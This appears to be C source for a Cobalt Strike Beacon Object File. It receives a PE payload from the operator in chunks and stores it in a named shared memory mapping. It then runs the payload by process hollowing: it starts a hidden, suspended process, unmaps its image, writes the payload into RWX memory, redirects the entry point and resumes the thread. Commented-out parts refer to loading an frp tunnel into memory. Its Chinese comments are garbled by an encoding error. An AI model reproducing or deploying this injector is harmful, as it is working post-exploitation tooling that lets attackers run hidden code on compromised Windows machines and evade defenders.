#include <stdio.h>
#include <windows.h>
#include "bofdefs.h"

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
void inject(char* peName, char* shellcode, SIZE_T shellcode_len) {
    IN PIMAGE_DOS_HEADER pDosHeaders;
    IN PIMAGE_NT_HEADERS pNtHeaders;
    IN PIMAGE_SECTION_HEADER pSectionHeaders;
    IN PVOID FileImage = shellcode;
    IN DWORD dwFileSize = shellcode_len;
    IN PVOID RemoteImageBase;
    IN PVOID RemoteProcessMemory;

    STARTUPINFOA si ;
    PROCESS_INFORMATION pi ;
    fnmemset(&si, 0, sizeof(si));
    fnmemset(&pi, 0, sizeof(pi));
    si.lpReserved = NULL;
    si.lpDesktop = NULL;
    si.lpTitle = NULL;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.cbReserved2 = NULL;
    si.lpReserved2 = NULL;
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    si.cb = sizeof(si);
    BOOL bRet = fnCreateProcessA(
        NULL,
        (LPSTR)peName,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi);


    pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders->e_lfanew); //��ȡNTͷ

    fnGetThreadContext(pi.hThread, &ctx); //��ȡ�������������

#ifdef _WIN64
    fnReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
    // ��rbx�Ĵ����л�ȡPEB��ַ������PEB�ж�ȡ��ִ��ӳ��Ļ�ַ
#endif
    // ��ebx�Ĵ����л�ȡPEB��ַ������PEB�ж�ȡ��ִ��ӳ��Ļ�ַ
#ifdef _X86_
    fnReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
#endif

    //�ж��ļ�Ԥ�ڼ��ص�ַ�Ƿ�ռ��
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)fnGetProcAddress(fnGetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
    {
        NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); //ж���Ѵ����ļ�
    }

    //Ϊ��ִ��ӳ������ڴ�,��д���ļ�ͷ
    RemoteProcessMemory = fnVirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    fnWriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    //���д��
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        fnWriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders->VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders->PointerToRawData), pSectionHeaders->SizeOfRawData, NULL);
    }

    //��rax�Ĵ�������Ϊע���������ڵ�
#ifdef _WIN64
    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    fnWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif

    //��eax�Ĵ�������Ϊע���������ڵ�
#ifdef _X86_
    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    fnWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif


    fnSetThreadContext(pi.hThread, &ctx); // �����߳�������
    fnResumeThread(pi.hThread); // �ָ������߳�

    fnCloseHandle(pi.hThread);
    fnCloseHandle(pi.hProcess);
}


/*
# state :
# 1 upload
# 2 upload complete
# 9999 frp already in memory
*/
void go(char* args, int length) {
    datap     parser;
    char* chunk;
    char* peName;
    char* frpc_Profile;
    SIZE_T    total_size;
    SIZE_T    chunk_size;
    SIZE_T    index;
    SIZE_T    state = 0;
    HANDLE    hMapFile;
    char      mapName[] = "d2295641ee77cf0d"; 
    void* mapAddr;
    WINBOOL   isUploadFinish = 0;

    /* parse args */
    BeaconDataParse(&parser, args, length);
    peName = BeaconDataExtract(&parser, NULL);
    state = BeaconDataInt(&parser);
    /*
    if (state == 0 || state == 9999) {
        frpc_Profile = BeaconDataExtract(&parser, NULL);
        if (KERNEL32$SetEnvironmentVariableA("d2295641ee77cf0c", frpc_Profile)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Set frpc profile in env");
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set frpc profile in env");
        }
    }
    */
    total_size = BeaconDataInt(&parser);
    if (state == 2) {
        isUploadFinish = 1;
    }
    /* ֱ��ִ�� */
    if (state == 9999) {
        //executeFrp(peName, mapName, total_size);

        /* ��Ҫ�ϴ� frp ���ڴ� */
    }
    else {
        index = BeaconDataInt(&parser);
        chunk_size = BeaconDataInt(&parser);
        chunk = BeaconDataExtract(&parser, NULL);




        BeaconPrintf(CALLBACK_OUTPUT, "[+] Uploading  %d/%d", index + chunk_size, total_size);


        /* �����ļ�ӳ�����洢 shellcode */
        hMapFile = KERNEL32$CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, total_size, mapName);
        if (hMapFile != NULL) {
            DWORD lastError = KERNEL32$GetLastError();
            if (lastError == 183) {
                /* �ڴ����Ѿ�����ӳ��,���� frp �Ѿ��ϲ����,ֱ��ִ�� */

                /* �Ѿ����� MapView ���ǻ�û���ϴ���� */
                if (index == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] FileMapping %s already exists", mapName);
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] CreateFileMapping %s success, size: %d", mapName, total_size);
            }
        }
        else {
            DWORD lastError = KERNEL32$GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not CreateFileMapping %s, ERROR: %d", mapName, lastError);
            BeaconPrintf(CALLBACK_ERROR, "[!] Exiting BOF..");
            return;
        }

        /* ӳ���ڴ� */
        mapAddr = KERNEL32$MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, total_size);
        if (mapAddr != NULL) {
            if (index == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] MapViewOfFile success addr: 0x%p size: %d", mapAddr, total_size);
        }
        else {
            DWORD lastError = KERNEL32$GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not MapViewOfFile, ERROR: %d", mapName, lastError);
            BeaconPrintf(CALLBACK_ERROR, "[!] Exiting BOF..");
            KERNEL32$CloseHandle(mapAddr);
            KERNEL32$CloseHandle(hMapFile);
            return;
        }

        /* ���� bof_pack ���ݹ����� shellcode copy �� MapView �ڴ��� */
        MSVCRT$memcpy((SIZE_T)mapAddr + index, chunk, chunk_size);
        if (isUploadFinish) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Upload shellcode completed %d/%d, now spawn process (%s) to execute!", index + chunk_size, total_size, peName);
            /* ����ָʾ�ڴ����Ѿ�����frp �� mapview */
            //if (!createStateMutex()) BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create state mutex");
            //spawn(peName, mapAddr, total_size);
            inject(peName, mapAddr, total_size);

            KERNEL32$CloseHandle(mapAddr);
            KERNEL32$CloseHandle(hMapFile);
        }
    }
}